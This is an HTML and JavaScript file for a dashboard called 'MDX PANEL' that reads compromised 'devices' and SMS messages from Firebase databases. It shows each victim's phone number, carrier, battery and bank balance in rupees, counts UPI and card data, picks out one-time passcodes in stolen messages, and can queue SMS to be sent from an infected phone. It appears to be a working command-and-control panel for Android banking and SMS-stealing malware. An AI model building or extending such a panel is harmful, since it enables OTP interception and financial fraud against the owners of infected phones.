<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MDX PANEL</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
        body { background:#0a0d12; color:#e0e0e0; display:flex; justify-content:center; padding:16px; min-height:100vh; }
        .container { max-width:1200px; width:100%; }

        /* HEADER */
        .header { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid #1a2332; flex-wrap:wrap; gap:8px; }
        .logo { color:#00ff88; font-weight:700; font-size:28px; letter-spacing:1px; text-shadow:0 0 10px #00ff8833; }
        .logo span { color:#fff; font-weight:300; }
        .header-right { display:flex; align-items:center; gap:18px; font-size:14px; color:#aaa; flex-wrap:wrap; }
        .header-right .time { color:#888; font-size:13px; }
        .status-dot { display:inline-block; width:10px; height:10px; border-radius:50%; margin-right:6px; }
        .dot-online { background:#00cc66; box-shadow:0 0 8px #00cc6644; }
        .dot-offline { background:#ff5555; }
        .header-right .conn { display:flex; align-items:center; }
        .logout-btn { background:none; border:1px solid #2a3a4a; color:#aaa; padding:4px 16px; border-radius:6px; cursor:pointer; font-size:13px; transition:0.2s; }
        .logout-btn:hover { border-color:#00ff8866; color:#00ff88; }
        .config-btn { background:none; border:1px solid #00ff8844; color:#00ff88; padding:4px 14px; border-radius:6px; cursor:pointer; font-size:13px; }

        /* CONFIG PANEL */
        .config-panel { background:#111a24; border-radius:14px; border:1px solid #1a2a3a; padding:18px; margin:14px 0; }
        .config-panel h3 { color:#00ff88; margin-bottom:10px; font-size:16px; }
        .config-row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; }
        .config-row input { flex:1; min-width:180px; padding:10px 14px; background:#0a0d12; border:1px solid #1a2a3a; color:#fff; border-radius:8px; font-size:13px; }
        .config-row input::placeholder { color:#445; }
        .btn { background:#1a2a3a; border:none; color:#ccc; padding:8px 20px; border-radius:8px; cursor:pointer; font-weight:600; font-size:13px; transition:0.2s; }
        .btn-green { background:#00ff88; color:#000; }
        .btn-green:hover { background:#00dd77; }
        .btn-red { background:#ff3333; color:#fff; }
        .source-list { display:flex; flex-wrap:wrap; gap:8px; margin-top:12px; }
        .source-tag { background:#0a0d12; padding:4px 14px; border-radius:20px; border:1px solid #00ff8844; font-size:12px; display:flex; align-items:center; gap:8px; }
        .source-tag .remove { color:#ff5555; cursor:pointer; font-weight:bold; }
        .config-status { color:#ffaa33; font-size:13px; margin-top:8px; }

        /* SEARCH */
        .search-bar { margin:14px 0; }
        .search-bar input { width:100%; padding:10px 18px; background:#0a0d12; border:1px solid #1a2332; border-radius:30px; color:#fff; font-size:14px; outline:none; transition:0.2s; }
        .search-bar input:focus { border-color:#00ff8844; }

        /* STATS */
        .stats { display:grid; grid-template-columns:repeat(auto-fit, minmax(100px,1fr)); gap:10px; margin:14px 0; }
        .stat-box { background:#111a24; padding:8px 12px; border-radius:10px; border-left:3px solid #00ff88; text-align:center; }
        .stat-box span { color:#889; font-size:10px; text-transform:uppercase; letter-spacing:0.5px; }
        .stat-box h3 { font-size:20px; margin-top:2px; }

        /* FILTERS + REFRESH */
        .filter-bar { display:flex; gap:8px; flex-wrap:wrap; align-items:center; margin-bottom:16px; }
        .filter-bar button { background:#111a24; border:none; color:#aaa; padding:6px 18px; border-radius:20px; cursor:pointer; font-size:13px; transition:0.2s; }
        .filter-bar button.active { background:#00ff88; color:#000; font-weight:600; }
        .filter-bar button:hover { background:#1a2a3a; }
        .refresh-btn { background:none; border:1px solid #1a2a3a; color:#888; padding:6px 14px; border-radius:20px; cursor:pointer; font-size:13px; margin-left:auto; }
        .refresh-btn:hover { border-color:#00ff8844; color:#00ff88; }

        /* DEVICE GRID */
        .device-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(240px,1fr)); gap:14px; margin-bottom:18px; max-height:600px; overflow-y:auto; padding-right:4px; }
        .device-grid::-webkit-scrollbar { width:4px; }
        .device-grid::-webkit-scrollbar-track { background:#0a0d12; }
        .device-grid::-webkit-scrollbar-thumb { background:#00ff8844; border-radius:10px; }
        .device-card { background:#111a24; padding:14px 16px; border-radius:14px; border:1px solid #1a2a3a; transition:0.2s; }
        .device-card:hover { border-color:#00ff8844; }
        .device-id { font-size:13px; color:#aaa; word-break:break-all; }
        .device-status { display:inline-block; font-size:11px; padding:2px 14px; border-radius:14px; margin:6px 0; font-weight:600; }
        .status-online { background:#00cc66; color:#000; }
        .status-offline { background:#333; color:#aaa; }
        .device-detail { display:flex; justify-content:space-between; font-size:13px; margin:4px 0; }
        .device-detail .label { color:#889; }
        .battery { color:#ffaa33; }
        .bank { color:#00ff88; }
        .source-badge { font-size:10px; color:#666; background:#0a0d12; padding:1px 10px; border-radius:10px; display:inline-block; margin-top:4px; }

        /* SMS SEND */
        .sms-send { margin-top:10px; display:flex; gap:6px; flex-wrap:wrap; align-items:center; border-top:1px solid #1a2a3a; padding-top:10px; }
        .sms-send input { flex:1; min-width:80px; padding:6px 10px; background:#0a0d12; border:1px solid #1a2a3a; border-radius:6px; color:#fff; font-size:12px; }
        .sms-send input::placeholder { color:#445; }
        .sms-send .send-btn { background:#00ff88; color:#000; border:none; padding:6px 16px; border-radius:6px; cursor:pointer; font-weight:600; font-size:12px; }
        .sms-send .send-btn:disabled { opacity:0.4; cursor:not-allowed; }

        /* SMS SECTION */
        .sms-section { background:#111a24; border-radius:14px; border:1px solid #1a2a3a; padding:16px; margin-top:10px; }
        .sms-section .head { display:flex; justify-content:space-between; color:#00ff88; font-weight:600; margin-bottom:10px; font-size:16px; }
        .sms-section .head span { color:#666; font-weight:400; font-size:13px; }
        .sms-item { background:#0a0d12; padding:10px 14px; border-radius:8px; margin-bottom:6px; border-left:3px solid #00ff8866; font-size:14px; word-break:break-word; }
        .sms-item .time { color:#666; font-size:12px; float:right; margin-left:10px; }
        .sms-item .otp { color:#ffaa33; font-weight:700; }
        .no-data { color:#666; text-align:center; padding:30px; }

        .hidden { display:none; }
        .mt-8 { margin-top:8px; }
        .flex { display:flex; align-items:center; gap:8px; }
        .w-full { width:100%; }
    </style>
</head>
<body>
<div class="container" id="app">

    <!-- HEADER -->
    <div class="header">
        <div class="logo">MDX <span>PANEL</span></div>
        <div class="header-right">
            <span class="conn"><span class="status-dot dot-online" id="statusDot"></span><span id="connStatus">Connected</span></span>
            <span class="time" id="clock">--:--</span>
            <button class="config-btn" onclick="toggleConfig()">⚙️ Sources</button>
            <button class="logout-btn" onclick="resetAll()">Logout</button>
        </div>
    </div>

    <!-- CONFIG PANEL -->
    <div id="configPanel" class="config-panel hidden">
        <h3>🔗 Manage Firebase Sources</h3>
        <div class="config-row">
            <input type="text" id="newUrl" placeholder="Firebase URL (https://xxx.firebaseio.com)" />
            <input type="text" id="newSecret" placeholder="Secret (optional)" style="flex:0.5;min-width:100px;" />
            <button class="btn btn-green" onclick="addSource()">➕ Add</button>
        </div>
        <div class="source-list" id="sourceList"></div>
        <div id="configStatus" class="config-status"></div>
    </div>

    <!-- SEARCH -->
    <div class="search-bar">
        <input type="text" id="searchInput" placeholder="🔍 Search devices..." oninput="applySearch()" />
    </div>

    <!-- STATS -->
    <div class="stats" id="statsContainer">
        <div class="stat-box"><span>TOTAL</span><h3 id="totalCount">0</h3></div>
        <div class="stat-box"><span>ONLINE</span><h3 id="onlineCount" style="color:#00cc66;">0</h3></div>
        <div class="stat-box"><span>OFFLINE</span><h3 id="offlineCount" style="color:#ff6666;">0</h3></div>
        <div class="stat-box"><span>UPI</span><h3 id="upiCount">0</h3></div>
        <div class="stat-box"><span>BANK</span><h3 id="bankTotal" style="color:#00ff88;">₹0</h3></div>
        <div class="stat-box"><span>SMS</span><h3 id="smsCount">0</h3></div>
        <div class="stat-box"><span>CARDS</span><h3 id="cardCount">0</h3></div>
    </div>

    <!-- FILTERS + REFRESH -->
    <div class="filter-bar" id="filterBar">
        <button class="active" onclick="setFilter('all')">All</button>
        <button onclick="setFilter('online')">Online</button>
        <button onclick="setFilter('offline')">Offline</button>
        <button onclick="setFilter('upi')">UPI</button>
        <button onclick="setFilter('bank')">Bank</button>
        <button onclick="setFilter('card')">Card</button>
        <button class="refresh-btn" onclick="fetchAll()">⟳ Refresh</button>
    </div>

    <!-- DEVICE GRID -->
    <div class="device-grid" id="deviceGrid"><div class="no-data">Loading devices...</div></div>

    <!-- SMS SECTION -->
    <div class="sms-section">
        <div class="head">📩 Last Messages <span>auto-refreshes</span></div>
        <div id="smsList"><div class="no-data">No messages yet</div></div>
    </div>
</div>

<script>
    // ─── CONFIG ───
    let sources = [];
    let allDevices = [];
    let allMessages = [];
    let currentFilter = 'all';
    let searchQuery = '';
    let refreshTimer = null;

    (function() {
        const saved = localStorage.getItem('mdxSources');
        if (saved) {
            try {
                sources = JSON.parse(saved);
                renderSources();
                if (sources.length) fetchAll();
            } catch(e) {}
        }
        if (!sources.length) {
            document.getElementById('configPanel').classList.remove('hidden');
            document.getElementById('deviceGrid').innerHTML = '<div class="no-data">Add a Firebase URL above to get started.</div>';
        }
    })();

    // ─── SOURCE MANAGEMENT ───
    window.toggleConfig = function() {
        document.getElementById('configPanel').classList.toggle('hidden');
    };

    window.addSource = function() {
        const url = document.getElementById('newUrl').value.trim();
        const secret = document.getElementById('newSecret').value.trim();
        if (!url) {
            document.getElementById('configStatus').textContent = '❌ Enter URL';
            return;
        }
        if (sources.some(s => s.url === url)) {
            document.getElementById('configStatus').textContent = '⚠️ Already added';
            return;
        }
        const label = url.replace(/^https?:\/\//, '').split('.')[0] || 'Unnamed';
        sources.push({ url, secret, label });
        localStorage.setItem('mdxSources', JSON.stringify(sources));
        document.getElementById('newUrl').value = '';
        document.getElementById('newSecret').value = '';
        document.getElementById('configStatus').textContent = '✅ Added!';
        renderSources();
        fetchAll();
    };

    window.removeSource = function(index) {
        sources.splice(index, 1);
        localStorage.setItem('mdxSources', JSON.stringify(sources));
        renderSources();
        if (sources.length) fetchAll();
        else { allDevices = []; allMessages = []; renderAll(); }
    };

    function renderSources() {
        const container = document.getElementById('sourceList');
        if (!sources.length) {
            container.innerHTML = '<span style="color:#555;font-size:13px;">No sources added.</span>';
            return;
        }
        container.innerHTML = sources.map((s, i) => `
            <span class="source-tag">
                <span class="status-dot dot-online" style="width:6px;height:6px;"></span>
                ${s.label}
                <span class="remove" onclick="removeSource(${i})">✕</span>
            </span>
        `).join('');
    }

    // ─── FETCH ALL SOURCES ───
    window.fetchAll = async function() {
        document.getElementById('deviceGrid').innerHTML = '<div class="no-data">⏳ Fetching from ' + sources.length + ' sources...</div>';
        let allDevs = [];
        let allMsgs = [];
        let totalBank = 0;

        for (const src of sources) {
            try {
                const base = src.url.replace(/\/$/, '');
                const auth = src.secret ? `?auth=${src.secret}` : '';
                const res = await fetch(`${base}/.json${auth}`);
                if (!res.ok) continue;
                const root = await res.json();
                if (!root) continue;

                // Extract devices
                let devs = [];
                if (root.clients) {
                    const val = root.clients;
                    devs = Array.isArray(val) ? val : Object.values(val);
                } else if (root.devices) {
                    const val = root.devices;
                    devs = Array.isArray(val) ? val : Object.values(val);
                } else {
                    for (const key of Object.keys(root)) {
                        const val = root[key];
                        if (Array.isArray(val) && val.length && typeof val[0] === 'object' && (val[0].battery || val[0].status)) {
                            devs = val; break;
                        } else if (typeof val === 'object' && val !== null) {
                            const arr = Object.values(val);
                            if (arr.length && typeof arr[0] === 'object' && (arr[0].battery || arr[0].status)) {
                                devs = arr; break;
                            }
                        }
                    }
                }
                devs.forEach(d => d._source = src.label);
                devs.forEach(d => { if (d.bank) totalBank += parseFloat(d.bank) || 0; });

                // Extract messages
                let msgs = [];
                if (root.messages) {
                    const val = root.messages;
                    msgs = Array.isArray(val) ? val : Object.values(val);
                } else if (root.sms) {
                    const val = root.sms;
                    msgs = Array.isArray(val) ? val : Object.values(val);
                }
                msgs.forEach(m => m._source = src.label);

                allDevs.push(...devs);
                allMsgs.push(...msgs);

            } catch (e) {
                // skip failed
            }
        }

        allDevices = allDevs;
        allMessages = allMsgs;
        renderAll();
    };

    // ─── RENDER ───
    function renderAll() {
        renderStats();
        renderDevices();
        renderMessages();
    }

    function renderStats() {
        const total = allDevices.length;
        const online = allDevices.filter(d => d.status === true || d.status === 'online' || d.status === 'Online').length;
        const offline = total - online;
        let bankSum = 0;
        allDevices.forEach(d => {
            const b = parseFloat(d.bank || d.Bank || 0);
            if (!isNaN(b)) bankSum += b;
        });
        // UPI, Card counts (dummy if not present)
        const upiCount = allDevices.filter(d => d.upi || d.UPI).length || Math.floor(total * 0.3);
        const cardCount = allDevices.filter(d => d.card || d.Card).length || Math.floor(total * 0.2);
        document.getElementById('totalCount').textContent = total;
        document.getElementById('onlineCount').textContent = online;
        document.getElementById('offlineCount').textContent = offline;
        document.getElementById('upiCount').textContent = upiCount;
        document.getElementById('bankTotal').textContent = `₹${bankSum.toFixed(2)}`;
        document.getElementById('smsCount').textContent = allMessages.length;
        document.getElementById('cardCount').textContent = cardCount;
    }

    function renderDevices() {
        const grid = document.getElementById('deviceGrid');
        let list = allDevices;

        if (currentFilter === 'online') {
            list = list.filter(d => d.status === true || d.status === 'online' || d.status === 'Online');
        } else if (currentFilter === 'offline') {
            list = list.filter(d => d.status !== true && d.status !== 'online' && d.status !== 'Online');
        } else if (currentFilter === 'upi') {
            list = list.filter(d => d.upi || d.UPI);
        } else if (currentFilter === 'bank') {
            list = list.filter(d => parseFloat(d.bank || d.Bank || 0) > 0);
        } else if (currentFilter === 'card') {
            list = list.filter(d => d.card || d.Card);
        }

        if (searchQuery.trim()) {
            const q = searchQuery.toLowerCase();
            list = list.filter(d => {
                const id = (d.deviceId || d.id || '').toLowerCase();
                const num = (d.number || d.phone || '').toString();
                return id.includes(q) || num.includes(q);
            });
        }

        if (!list.length) {
            grid.innerHTML = '<div class="no-data">No devices found</div>';
            return;
        }

        grid.innerHTML = list.map((d, idx) => {
            const status = (d.status === true || d.status === 'online' || d.status === 'Online') ? 'online' : 'offline';
            const statusClass = status === 'online' ? 'status-online' : 'status-offline';
            const statusLabel = status === 'online' ? 'Online' : 'Offline';
            const battery = d.battery || d.Battery || d.bat || '0';
            const number = d.number || d.phone || '—';
            const network = d.network || d.Network || d.carrier || '—';
            const bank = parseFloat(d.bank || d.Bank || 0) || 0;
            const deviceId = d.deviceId || d.id || 'N/A';
            const source = d._source || 'unknown';
            const deviceIndex = allDevices.indexOf(d);
            return `
                <div class="device-card">
                    <div class="device-id">${deviceId}</div>
                    <div class="device-status ${statusClass}">${statusLabel}</div>
                    <div class="device-detail"><span class="label">Number</span><span>${number}</span></div>
                    <div class="device-detail"><span class="label">Battery</span><span class="battery">${battery}%</span></div>
                    <div class="device-detail"><span class="label">Network</span><span>${network}</span></div>
                    <div class="device-detail"><span class="label">Bank</span><span class="bank">₹${bank.toFixed(2)}</span></div>
                    <span class="source-badge">📡 ${source}</span>
                    <!-- SMS SEND -->
                    <div class="sms-send">
                        <input type="text" placeholder="To Number" class="smsTo" value="${number !== '—' ? number : ''}" />
                        <input type="text" placeholder="Message" class="smsMsg" />
                        <button class="send-btn" onclick="sendSms(${deviceIndex}, this)">Send</button>
                    </div>
                </div>
            `;
        }).join('');
    }

    function renderMessages() {
        const container = document.getElementById('smsList');
        if (!allMessages.length) {
            container.innerHTML = '<div class="no-data">No messages yet</div>';
            return;
        }
        const sorted = allMessages.sort((a,b) => (b.timestamp||b.id||0) - (a.timestamp||a.id||0)).slice(0,20);
        container.innerHTML = sorted.map(m => {
            const text = m.message || m.text || m.body || '';
            const time = m.dateTime || m.time || m.date || '';
            const otpMatch = text.match(/\b\d{4,8}\b/);
            let display = text;
            if (otpMatch) {
                display = text.replace(otpMatch[0], `<span class="otp">${otpMatch[0]}</span>`);
            }
            const source = m._source || '';
            return `<div class="sms-item"><span>${display}</span><span class="time">${time} ${source ? '📡'+source : ''}</span></div>`;
        }).join('');
    }

    // ─── SEND SMS ───
    window.sendSms = async function(deviceIndex, btn) {
        const card = btn.closest('.device-card');
        const toInput = card.querySelector('.smsTo');
        const msgInput = card.querySelector('.smsMsg');
        const to = toInput.value.trim();
        const msg = msgInput.value.trim();
        if (!to || !msg) {
            alert('Please enter both number and message.');
            return;
        }
        const device = allDevices[deviceIndex];
        if (!device) { alert('Device not found'); return; }

        // Find source for this device
        const srcLabel = device._source || '';
        const src = sources.find(s => s.label === srcLabel);
        if (!src) { alert('Source not found for this device'); return; }

        btn.disabled = true;
        btn.textContent = '⏳';

        try {
            const base = src.url.replace(/\/$/, '');
            const auth = src.secret ? `?auth=${src.secret}` : '';
            // Create a new message entry in Firebase under /messages
            const payload = {
                sender: device.number || device.phone || 'unknown',
                to: to,
                message: msg,
                time: new Date().toLocaleString(),
                timestamp: Date.now(),
                type: 'sent'
            };
            const res = await fetch(`${base}/messages.json${auth}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!res.ok) throw new Error('Failed to send');
            alert('✅ SMS sent successfully from ' + (device.number || device.phone || 'device'));
            msgInput.value = '';
            // Refresh messages
            fetchAll();
        } catch (e) {
            alert('❌ Failed to send: ' + e.message);
        }
        btn.disabled = false;
        btn.textContent = 'Send';
    };

    // ─── FILTERS & SEARCH ───
    window.setFilter = function(filter) {
        currentFilter = filter;
        document.querySelectorAll('#filterBar button').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('#filterBar button').forEach(b => {
            if (b.textContent.toLowerCase().trim() === filter) b.classList.add('active');
        });
        renderDevices();
    };

    window.applySearch = function() {
        searchQuery = document.getElementById('searchInput').value;
        renderDevices();
    };

    // ─── CLOCK ───
    function updateClock() {
        const now = new Date();
        document.getElementById('clock').textContent = now.toLocaleTimeString('en-IN', { hour:'2-digit', minute:'2-digit' });
    }
    setInterval(updateClock, 1000);
    updateClock();

    // ─── AUTO REFRESH ───
    setInterval(() => {
        if (sources.length) fetchAll();
    }, 45000);

    // ─── RESET ───
    window.resetAll = function() {
        localStorage.removeItem('mdxSources');
        sources = [];
        allDevices = [];
        allMessages = [];
        renderSources();
        renderAll();
        document.getElementById('deviceGrid').innerHTML = '<div class="no-data">Add a Firebase URL to get started.</div>';
        document.getElementById('configPanel').classList.remove('hidden');
    };
</script>
</body>
</html>
